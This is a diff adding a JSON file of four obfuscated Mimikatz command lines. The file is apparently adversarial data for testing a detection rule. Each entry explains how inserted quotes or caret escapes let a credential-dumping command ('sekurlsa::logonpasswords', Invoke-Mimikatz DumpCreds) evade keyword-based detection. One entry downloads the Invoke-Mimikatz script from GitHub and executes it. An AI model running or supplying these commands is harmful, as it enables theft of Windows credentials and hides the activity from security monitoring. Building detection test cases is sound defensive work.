@@ -1,0 +1,18 @@
+[
+  {
+    "output": "C:\\Tools\\mimi.exe \"sekurlsa::\"\"logonpasswords\" exit",
+    "explanation": "Insertion technique: Inserting a pair of adjacent empty double quotes within the module execution string syntax ('sekurlsa::\"\"logonpasswords'). Because the binary has been renamed to 'mimi.exe' to avoid 'selection_tools_name', the rule relies strictly on 'selection_module_names'. The native command-line processor strips out empty quotes at runtime initialization, assembling the exact argument pattern internally while breaking the continuous text pattern check for 'sekurlsa::'."
+  },
+  {
+    "output": "cmd.exe /c C:\\Tools\\mimi.exe sekurlsa^::logonpasswords exit",
+    "explanation": "Insertion technique: Routing execution through a cmd.exe wrapper context allows the integration of a command shell caret escape operator ('^') directly into the module colon delimiters ('sekurlsa^::'). The parent command interpreter consumes and drops this escape modifier prior to executing the binary, leaving a process log footprint of 'sekurlsa^::' that evades literal keyword tracking."
+  },
+  {
+    "output": "C:\\Tools\\mimi.exe \"sekurlsa\"\"::\"logonpasswords exit",
+    "explanation": "Insertion technique: Splitting the module argument token via inline double quotes ('\"sekurlsa\"\"::\"'). Windows transparently handles and unquotes individual inline string segments during process tokenization, loading the full cohesive parameter natively into the binary while successfully blinding string signature rule monitors looking exclusively for 'sekurlsa::'."
+  },
+  {
+    "output": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Dump\"\"Creds\"",
+    "explanation": "Insertion technique: Inserting an internal pair of empty double quotes inside the target PowerShell script switch parameter flag ('-Dump\"\"Creds'). The PowerShell script parser automatically merges the adjacent sub-strings into the cohesive string variable target at runtime execution, successfully downloading and executing the payload while breaking the literal match constraint for 'DumpCreds'."
+  }
+]
